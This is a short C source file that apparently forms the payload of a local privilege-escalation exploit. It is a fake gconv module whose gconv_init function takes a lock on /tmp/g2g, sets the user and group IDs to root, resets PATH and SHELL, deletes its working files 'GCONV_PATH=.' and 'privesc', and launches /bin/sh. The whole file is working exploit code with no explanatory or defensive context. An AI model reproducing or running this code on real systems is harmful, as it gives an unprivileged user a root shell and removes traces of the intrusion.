#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/file.h>
#include <unistd.h>

void payload() {
  setuid(0);
  setgid(0);
  setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/bin:/bin/:", 1);
  setenv("SHELL", "/bin/sh", 1);
  system("rm -rf GCONV_PATH=.");
  system("rm -rf privesc");
  system("/bin/sh");
}

void gconv() {}

void gconv_init() {
  int lfd = open("/tmp/g2g", O_RDWR);

  // lock file for our use only
  flock(lfd, LOCK_EX);

  payload();

  system("rm /tmp/g2g");

  exit(EXIT_SUCCESS);
}
